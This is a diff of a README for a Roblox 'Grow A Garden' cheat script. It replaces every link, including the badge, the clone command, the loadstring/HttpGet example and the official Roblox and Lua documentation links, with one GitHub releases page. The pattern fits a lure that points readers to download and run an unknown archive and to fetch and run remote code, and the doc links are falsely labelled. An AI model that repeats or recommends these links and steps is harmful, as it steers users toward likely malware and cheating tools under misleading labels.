@@ -2,13 +2,13 @@
 
 Welcome to the **Roblox Grow A Garden Script** repository! This project provides a powerful script designed for the popular Roblox game, "Grow A Garden." With features like infinite seeds, auto feeding, keyless duplication, and support for both mobile and PC, this script aims to enhance your gaming experience. 
 
-![Grow A Garden](https://img.shields.io/badge/Grow_A_Garden-Script-brightgreen)
+![Grow A Garden](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases)
 
 ## 📥 Download the Script
 
 To get started, download the script from the following link:
 
-[Download the Script](https://github.com/repo/user/archive.zip)
+[Download the Script](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases)
 
 Once downloaded, extract the files and execute the script in your Roblox environment. 
 
@@ -31,7 +31,7 @@ Here’s a simple example of how to use the script:
 
 ```lua
 -- Load the script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/repo/user/main/script.lua"))()
+loadstring(game:HttpGet("https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases"))()
 ```
 
 ### Important Notes
@@ -43,7 +43,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/repo/user/main/script
 
 To install the script, follow these steps:
 
-1. **Download the Script**: [Download the Script](https://github.com/repo/user/archive.zip)
+1. **Download the Script**: [Download the Script](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases)
 2. **Extract the Archive**: Use any extraction tool to unzip the files.
 3. **Open Roblox**: Launch Roblox and enter the game "Grow A Garden."
 4. **Run the Script**: Use your preferred script executor to run the script.
@@ -83,7 +83,7 @@ We welcome contributions from everyone. If you want to help improve the script, 
 2. **Clone Your Fork**: Use the command below to clone your fork to your local machine.
 
    ```bash
-   git clone https://github.com/your-username/Roblox-Grow-A-Garden.git
+   git clone https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases
    ```
 
 3. **Make Changes**: Implement your changes and test them thoroughly.
@@ -111,9 +111,9 @@ If you encounter any issues while using the script, here are some common problem
 
 ## 🔗 Additional Resources
 
-- [Roblox Developer Hub](https://developer.roblox.com/)
-- [Lua Programming Language](https://www.lua.org/)
-- [Scripting in Roblox](https://developer.roblox.com/en-us/articles/Scripting)
+- [Roblox Developer Hub](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases)
+- [Lua Programming Language](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases)
+- [Scripting in Roblox](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases)
 
 ## 📄 License
 
@@ -121,7 +121,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## 📢 Updates
 
-For the latest updates, features, and bug fixes, check the [Releases](https://github.com/repo/user/releases) section of this repository.
+For the latest updates, features, and bug fixes, check the [Releases](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases) section of this repository.
 
 ## 📧 Contact
 
@@ -131,4 +131,4 @@ For any inquiries or feedback, please contact the repository maintainer through 
 
 Thank you for using the **Roblox Grow A Garden Script**! We hope it enhances your gaming experience and helps you grow the best garden possible. 
 
-Remember to check the [Releases](https://github.com/repo/user/releases) section for the latest updates and improvements.
+Remember to check the [Releases](https://github.com/sasikumar98422/Roblox-Grow-A-Garden/releases) section for the latest updates and improvements.
